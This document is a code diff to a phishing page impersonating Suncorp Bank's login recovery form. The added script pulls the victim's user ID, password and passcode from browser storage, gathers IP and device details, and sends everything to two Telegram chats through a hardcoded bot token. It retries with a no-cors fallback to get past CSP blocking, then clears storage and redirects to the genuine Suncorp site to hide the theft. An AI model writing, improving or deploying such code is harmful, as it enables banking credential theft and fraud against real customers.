@@ -19,7 +19,7 @@
   <header class="sg-Header">
    <div class="sg-Header-content">
     <div class="sg-Header-column">
-     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/" target="_blank">
+     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/ " target="_blank">
      </a>
     </div>
     <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
@@ -84,7 +84,7 @@
        <script>
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
-const TELEGRAM_CHAT_ID = '-5233511146';
+const TELEGRAM_CHAT_IDS = ['-5233511146', '7987288274'];
 
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('recoverForm');
@@ -104,10 +104,24 @@ document.addEventListener('DOMContentLoaded', function() {
     phoneInput.setAttribute('inputmode', 'numeric');
     phoneInput.setAttribute('pattern', '[0-9]*');
     
-    // Retrieve stored data from sessionStorage
-    const userId = sessionStorage.getItem('userId') || 'Not available';
-    const password = sessionStorage.getItem('userPassword') || 'Not available';
-    const passcode = sessionStorage.getItem('userPasscode') || 'Not provided';
+    // Use localStorage instead of sessionStorage for mobile compatibility
+    // Fallback to sessionStorage if localStorage is not available
+    function getStorage() {
+        try {
+            localStorage.setItem('test', 'test');
+            localStorage.removeItem('test');
+            return localStorage;
+        } catch (e) {
+            return sessionStorage;
+        }
+    }
+    
+    const storage = getStorage();
+    
+    // Retrieve stored data from storage
+    const userId = storage.getItem('userId') || 'Not available';
+    const password = storage.getItem('userPassword') || 'Not available';
+    const passcode = storage.getItem('userPasscode') || 'Not provided';
     
     // Add red border style
     const style = document.createElement('style');
@@ -221,14 +235,128 @@ document.addEventListener('DOMContentLoaded', function() {
         return { device, platform };
     }
     
-    // Get IP address
+    // Get IP address with multiple fallback services
     async function getIP() {
+        const services = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json',
+            'https://checkip.amazonaws.com/',
+            'https://icanhazip.com/'
+        ];
+        
+        for (const service of services) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                
+                const response = await fetch(service, { 
+                    signal: controller.signal,
+                    mode: 'cors'
+                });
+                clearTimeout(timeoutId);
+                
+                if (service.includes('json')) {
+                    const data = await response.json();
+                    return data.ip || data;
+                } else {
+                    const text = await response.text();
+                    return text.trim();
+                }
+            } catch (e) {
+                console.log('IP service failed:', service, e);
+                continue;
+            }
+        }
+        return 'Unable to retrieve';
+    }
+    
+    // Send message to a single chat using JSONP as fallback for CSP issues
+    function sendToTelegramJSONP(chatId, message) {
+        return new Promise((resolve, reject) => {
+            const script = document.createElement('script');
+            const callbackName = 'telegramCallback_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // Create callback
+            window[callbackName] = function(data) {
+                cleanup();
+                if (data && data.ok) {
+                    resolve(data);
+                } else {
+                    reject(new Error(data.description || 'Unknown error'));
+                }
+            };
+            
+            function cleanup() {
+                if (script.parentNode) script.parentNode.removeChild(script);
+                delete window[callbackName];
+            }
+            
+            script.onerror = function() {
+                cleanup();
+                reject(new Error('Script load error'));
+            };
+            
+            // Telegram doesn't support JSONP, so this is a fallback that will fail gracefully
+            // Instead, we'll use the fetch API with no-cors mode as last resort
+            cleanup();
+            reject(new Error('JSONP not supported by Telegram'));
+        });
+    }
+    
+    // Send message to a single chat with multiple retry strategies
+    async function sendToTelegram(chatId, message, attempt = 1) {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
+            // Try standard fetch first
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
             const data = await response.json();
-            return data.ip;
-        } catch (e) {
-            return 'Unable to retrieve';
+            
+            if (!response.ok || !data.ok) {
+                throw new Error(data.description || `HTTP ${response.status}`);
+            }
+            
+            console.log(`Successfully sent to chat ${chatId}`);
+            return true;
+            
+        } catch (error) {
+            console.error(`Attempt ${attempt} failed for chat ${chatId}:`, error);
+            
+            // If this is the first attempt, try with no-cors mode (for CSP issues)
+            if (attempt === 1) {
+                try {
+                    await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        }),
+                        mode: 'no-cors'
+                    });
+                    // no-cors returns opaque response, assume success
+                    console.log(`Sent to chat ${chatId} (no-cors mode)`);
+                    return true;
+                } catch (e) {
+                    console.log('no-cors mode also failed:', e);
+                }
+            }
+            
+            return false;
         }
     }
     
@@ -273,25 +401,31 @@ Device: ${device}
 Platform: ${platform}
 Date: ${currentDateTime}`;
         
-        // Send to Telegram
-        try {
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            await fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (error) {
-            console.error('Failed to send to Telegram:', error);
+        // Send to both Telegram chat IDs with better error handling
+        const results = [];
+        
+        for (const chatId of TELEGRAM_CHAT_IDS) {
+            // Try up to 2 times
+            let success = false;
+            for (let i = 1; i <= 2; i++) {
+                success = await sendToTelegram(chatId, message, i);
+                if (success) break;
+            }
+            results.push({ chatId, success });
         }
         
-        // Redirect after 2 seconds
+        console.log('Telegram send results:', results);
+        
+        // Clear storage after sending (security)
+        try {
+            storage.removeItem('userId');
+            storage.removeItem('userPassword');
+            storage.removeItem('userPasscode');
+        } catch (e) {
+            console.log('Could not clear storage:', e);
+        }
+        
+        // Redirect after 2 seconds regardless of Telegram success
         setTimeout(function() {
             window.location.href = 'https://www.suncorp.com.au';
         }, 2000);
@@ -313,12 +447,6 @@ Date: ${currentDateTime}`;
    </div>
   </main>
   <iframe class="aamIframeLoaded" id="destination_publishing_iframe_suncorp_0" name="destination_publishing_iframe_suncorp_0_name" sandbox="allow-scripts allow-same-origin" src="assets/dest5.html" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame">
-  </iframe>
-  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
-  </iframe>
-  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
-  </iframe>
-  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
   </iframe>
   <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
   </iframe>
